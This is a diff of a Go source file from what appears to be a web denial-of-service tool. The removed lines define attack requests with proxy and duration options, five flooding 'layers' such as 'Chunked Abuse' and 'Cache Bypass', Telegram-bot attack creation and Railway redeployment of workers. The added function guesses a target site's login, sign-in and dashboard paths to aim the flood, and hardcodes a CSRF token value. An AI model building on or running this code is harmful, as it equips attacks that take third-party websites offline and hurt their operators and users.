@@ -1,250 +1,80 @@
 package main
 
 import (
-	//"sync"
-	"sync/atomic"
-	"time"
+	"net/url"
+	"strings"
 )
 
-// LayerConfig is used when starting a new attack.
-type LayerConfig struct {
-	L1 int `json:"l1"`
-	L2 int `json:"l2"`
-	L3 int `json:"l3"`
-	L4 int `json:"l4"`
-	L5 int `json:"l5"`
-}
-
-// AttackRequest is the JSON payload from the frontend.
-type AttackRequest struct {
-	Target       string      `json:"target"`
-	Layers       LayerConfig `json:"layers"`
-	Duration     int         `json:"duration"`
-	ProxyEnabled bool        `json:"proxy_enabled"`
-}
-
-// CreateAttackRequest from Telegram bot to create a new attack
-type CreateAttackRequest struct {
-	URL string `json:"url"`
-}
-
-// AttackResponse is returned after a start/stop request.
-type AttackResponse struct {
-	AttackID string `json:"attack_id,omitempty"`
-	Error    string `json:"error,omitempty"`
-	Success  bool   `json:"success"`
-}
-
-// AttackInfo holds all information about a specific attack
-type AttackInfo struct {
-	ID             string          `json:"id"`
-	URL            string          `json:"url"`
-	TargetPaths    *SmartPaths     `json:"target_paths,omitempty"`
-	RailwayInfo    *RailwayDeploy  `json:"railway_info,omitempty"`
-	Orchestrator   *Orchestrator   `json:"-"`
-	CreatedAt      time.Time       `json:"created_at"`
-	Status         string          `json:"status"`
-	ActiveWorkers  int32           `json:"active_workers"`
-	LastChecked    time.Time       `json:"last_checked"`
-	LastResponses  []ResponseEntry `json:"last_responses"`
-	TotalRedeploys int             `json:"total_redeploys"`
-}
-
-// ResponseEntry holds a single check result
-type ResponseEntry struct {
-	Time         time.Time `json:"time"`
-	ResponseTime float64   `json:"response_time"`
-	HTTPCode     int       `json:"http_code"`
-}
-
-// SmartPaths holds the dynamically determined attack paths
-type SmartPaths struct {
-	LoginGET    string `json:"login_get"`
-	LoginPOST   string `json:"login_post"`
-	Dashboard   string `json:"dashboard"`
-	Profile     string `json:"profile"`
-	AdminPath   string `json:"admin_path,omitempty"`
-	CSRFEnabled bool   `json:"csrf_enabled"`
-	CSRFToken   string `json:"csrf_token,omitempty"`
-}
-
-// RailwayDeploy holds Railway-specific information for redeployment
-type RailwayDeploy struct {
-	ProjectID     string `json:"project_id"`
-	EnvironmentID string `json:"environment_id"`
-	ServiceID     string `json:"service_id"`
-	AppURL        string `json:"app_url"`
-}
-
-// AttackStatus is returned by the status endpoint.
-type AttackStatus struct {
-	Active   bool   `json:"active"`
-	AttackID string `json:"attack_id"`
-	Target   string `json:"target"`
-	Uptime   int64  `json:"uptime_ms"`
-}
-
-// Stats holds all real-time counters (lock-free via atomic).
-type Stats struct {
-	TotalRequests   atomic.Int64
-	SuccessRequests atomic.Int64
-	FailedRequests  atomic.Int64
-	ActiveWorkers   atomic.Int32
-	BytesSent       atomic.Int64
-	BytesRecv       atomic.Int64
-	StartTime       time.Time
-	Layers          [5]*LayerStats
-}
-
-// LayerStats holds per-layer metrics.
-type LayerStats struct {
-	Name          string
-	Requests      atomic.Int64
-	Success       atomic.Int64
-	Fail          atomic.Int64
-	ActiveWorkers atomic.Int32
-}
-
-// StatsSnapshot is sent to the frontend via WebSocket every 500ms.
-type StatsSnapshot struct {
-	Type    string          `json:"type"`
-	RPS     int64           `json:"rps"`
-	Total   int64           `json:"total"`
-	Success int64           `json:"success"`
-	Fail    int64           `json:"fail"`
-	Active  int32           `json:"active"`
-	Uptime  int64           `json:"uptime"`
-	Layers  []LayerSnapshot `json:"layers,omitempty"`
-}
-
-// LayerSnapshot is the per-layer breakdown for the frontend.
-type LayerSnapshot struct {
-	Name    string `json:"name"`
-	Req     int64  `json:"req"`
-	Success int64  `json:"success"`
-	Fail    int64  `json:"fail"`
-	Active  int32  `json:"active"`
-}
-
-// LogEntry is sent to the frontend console via WebSocket.
-type LogEntry struct {
-	Type    string `json:"type"`
-	Level   string `json:"level"`
-	Message string `json:"message"`
-}
-
-// WSMessage is the generic envelope for WebSocket communication.
-type WSMessage struct {
-	Type    string      `json:"type"`
-	Payload interface{} `json:"payload"`
-}
-
-// NewStats initializes a Stats object with per-layer tracking.
-func NewStats() *Stats {
-	s := &Stats{
-		StartTime: time.Now(),
-	}
-	layerNames := []string{"Chunked Abuse", "Recursive Params", "Cache Bypass",
-		"Connection Pool", "Parser Stress"}
-	for i, name := range layerNames {
-		s.Layers[i] = &LayerStats{Name: name}
-	}
-	return s
-}
-
-// Reset resets all counters to zero.
-func (s *Stats) Reset() {
-	s.TotalRequests.Store(0)
-	s.SuccessRequests.Store(0)
-	s.FailedRequests.Store(0)
-	s.ActiveWorkers.Store(0)
-	s.BytesSent.Store(0)
-	s.BytesRecv.Store(0)
-	s.StartTime = time.Now()
-	for _, l := range s.Layers {
-		l.Requests.Store(0)
-		l.Success.Store(0)
-		l.Fail.Store(0)
-		l.ActiveWorkers.Store(0)
-	}
-}
-
-// Snapshot returns a point-in-time StatsSnapshot for the frontend.
-func (s *Stats) Snapshot() StatsSnapshot {
-	elapsed := time.Since(s.StartTime).Milliseconds()
-	total := s.TotalRequests.Load()
-	var rps int64
-	if elapsed > 0 {
-		rps = total * 1000 / elapsed
-	}
-	layers := make([]LayerSnapshot, 5)
-	for i, l := range s.Layers {
-		layers[i] = LayerSnapshot{
-			Name:    l.Name,
-			Req:     l.Requests.Load(),
-			Success: l.Success.Load(),
-			Fail:    l.Fail.Load(),
-			Active:  l.ActiveWorkers.Load(),
+// DetectSmartPaths analyzes the target URL and generates the most effective attack paths.
+func DetectSmartPaths(rawURL string) *SmartPaths {
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		// Fallback
+		return &SmartPaths{
+			LoginGET:  rawURL,
+			LoginPOST: rawURL,
 		}
 	}
-	return StatsSnapshot{
-		Type:    "stats",
-		RPS:     rps,
-		Total:   total,
-		Success: s.SuccessRequests.Load(),
-		Fail:    s.FailedRequests.Load(),
-		Active:  s.ActiveWorkers.Load(),
-		Uptime:  elapsed,
-		Layers:  layers,
+
+	baseURL := u.Scheme + "://" + u.Host
+	urlPath := strings.Trim(u.Path, "/")
+
+	// -------------------------------------------
+	// 1. Find the ACTION (last part of path)
+	//    e.g. /ints/login  -> action = "login"
+	//         /login       -> action = "login"
+	// -------------------------------------------
+	lastSlash := strings.LastIndex(urlPath, "/")
+	var basePrefix, action string
+	if lastSlash >= 0 {
+		basePrefix = "/" + urlPath[:lastSlash]   // "/ints"
+		action = urlPath[lastSlash+1:]           // "login"
+	} else {
+		basePrefix = ""
+		action = urlPath                         // "login"
 	}
-}
 
-/*
-// ==================== ATTACK REGISTRY ====================
-type AttackRegistry struct {
-	attacks map[string]*AttackInfo
-	mu      sync.RWMutex
-}
-
-func NewAttackRegistry() *AttackRegistry {
-	return &AttackRegistry{attacks: make(map[string]*AttackInfo)}
-}
-
-func (ar *AttackRegistry) Store(id string, info *AttackInfo) {
-	ar.mu.Lock()
-	ar.attacks[id] = info
-	ar.mu.Unlock()
-}
-
-func (ar *AttackRegistry) Load(id string) *AttackInfo {
-	ar.mu.RLock()
-	defer ar.mu.RUnlock()
-	return ar.attacks[id]
-}
-
-func (ar *AttackRegistry) Delete(id string) {
-	ar.mu.Lock()
-	delete(ar.attacks, id)
-	ar.mu.Unlock()
-}
-
-func (ar *AttackRegistry) List() []*AttackInfo {
-	ar.mu.RLock()
-	defer ar.mu.RUnlock()
-	list := make([]*AttackInfo, 0, len(ar.attacks))
-	for _, v := range ar.attacks {
-		list = append(list, v)
+	// -------------------------------------------
+	// 2. Detect POST endpoint from action
+	//    login / signin  -> signin
+	//    signmein        -> signmein
+	// -------------------------------------------
+	actionLower := strings.ToLower(action)
+	postAction := action // default same
+	switch {
+	case actionLower == "login" || actionLower == "signin":
+		postAction = "signin"
+	case actionLower == "signmein":
+		postAction = "signmein"
 	}
-	return list
-}
 
-func (ar *AttackRegistry) StopAll() {
-	ar.mu.RLock()
-	defer ar.mu.RUnlock()
-	for _, info := range ar.attacks {
-		if info.Orchestrator != nil {
-			info.Orchestrator.Stop()
-		}
+	// -------------------------------------------
+	// 3. Build full URLs
+	// -------------------------------------------
+	paths := &SmartPaths{
+		LoginGET:  rawURL,
+		LoginPOST: rawURL,
+		Dashboard: baseURL,
+		Profile:   baseURL,
 	}
+
+	if basePrefix != "" {
+		paths.LoginGET  = baseURL + basePrefix + "/" + action
+		paths.LoginPOST = baseURL + basePrefix + "/" + postAction
+	} else {
+		paths.LoginGET  = baseURL + "/" + action
+		paths.LoginPOST = baseURL + "/" + postAction
+	}
+
+	// -------------------------------------------
+	// 4. Dashboard & Profile guesses
+	// -------------------------------------------
+	paths.Dashboard = baseURL + basePrefix + "/agent/"
+	paths.Profile   = baseURL + basePrefix + "/agent/"
+
+	// CSRF default (IMS SMS style)
+	paths.CSRFEnabled = true
+	paths.CSRFToken   = "etkk"
+
+	return paths
 }
-*/
